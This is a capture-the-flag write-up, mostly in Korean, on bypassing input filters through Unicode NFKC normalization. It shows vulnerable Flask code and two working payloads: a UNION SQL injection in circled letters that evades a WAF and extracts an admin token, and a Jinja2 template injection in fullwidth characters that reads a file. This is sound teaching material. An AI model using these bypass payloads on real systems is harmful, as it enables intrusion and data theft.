# Scrambled (Polylot Notes) - CTF Writeup

---

## Key

 - Lost in Translation: Exploiting Unicode Normalization
 - CWE-180: Incorrect Behavior Order (Validate Before Canonicalize)

---

## Stage 1: UNION SQLi — Circled Letter WAF Bypass

**파일:** `app/routes/api.py`

### 취약 코드

```python
# WAF: raw input에 대해 SQL 키워드 검사 (정규화 이전)
if _WAF_SQLI.search(q_raw):          # ← Circled letters는 매칭 안 됨
    return 403

# WAF 이후에 NFKC 정규화 수행
q = unicodedata.normalize('NFKC', q_raw)  # Circled → ASCII

# 정규화된 q를 f-string으로 SQL에 직접 삽입
sql = f"... AND n.title LIKE '%{q}%' ..."
```

### 공격 원리

| 문자 | 코드포인트 | NFKC 결과 |
|---|---|---|
| `ⓤ` | U+24E4 | `u` |
| `ⓝ` | U+24DD | `n` |
| `ⓘ` | U+24D8 | `i` |
| `ⓞ` | U+24DE | `o` |
| `ⓝ` | U+24DD | `n` |

WAF 정규식 `\bunion\b`는 `ⓤⓝⓘⓞⓝ`에 매칭되지 않음 → 통과.  
NFKC 정규화 후 `union`이 됨 → SQL에 주입됨.

### 인텐 페이로드

```
GET /api/notes/search?q=%25'%20ⓤⓝⓘⓞⓝ%20ⓢⓔⓛⓔⓒⓣ%20api_token,2,3,4%20from%20admin_sessions--%20-
```

정규화 후 실행 SQL:
```sql
SELECT n.id, n.title, LEFT(n.content,300), u.display_name
FROM   notes n JOIN users u ON n.user_id = u.id
WHERE  n.is_public = 1 AND n.title LIKE '%%'
UNION SELECT api_token,2,3,4 FROM admin_sessions-- -%'
```

**결과:** `admin_sessions` 테이블의 `api_token` 컬럼 값 반환  
→ `4dm1n-4p1-t0k3n-s3cr3t-2025-p0ly10t`

---

## Stage 2: SSTI — Fullwidth Characters Filter Bypass

**파일:** `app/routes/admin.py`

### 취약 코드

```python
# Filter: raw input에 대해 특수문자 차단 (정규화 이전)
if _TEMPLATE_INJECTION_FILTER.search(content):  # ← Fullwidth는 매칭 안 됨
    return 400

# 필터 이후에 NFKC 정규화 수행
normalized_content = unicodedata.normalize('NFKC', content)  # Fullwidth → ASCII

# 정규화된 content를 f-string으로 Jinja2 템플릿에 직접 삽입
template = f"<span lang='{lang}' class='translation'>{normalized_content}</span>"
result   = render_template_string(template)  # SSTI 발생
```

### 공격 원리

| 문자 | 코드포인트 | NFKC 결과 | Filter |
|---|---|---|---|
| `｛` | U+FF5B | `{` | 통과 |
| `｝` | U+FF5D | `}` | 통과 |
| `＇` | U+FF07 | `'` | 통과 |

### 인텐 페이로드

```
GET /admin/render?content=｛｛lipsum.__globals__.__builtins__.open(＇/flag＇).read()｝｝
X-Admin-Token: 4dm1n-4p1-t0k3n-s3cr3t-2025-p0ly10t
```

정규화 후 Jinja2 템플릿:
```
<span lang='en' class='translation'>{{lipsum.__globals__.__builtins__.open('/flag').read()}}</span>
```

최종적으로 `/flag` 파일 내용 반환

---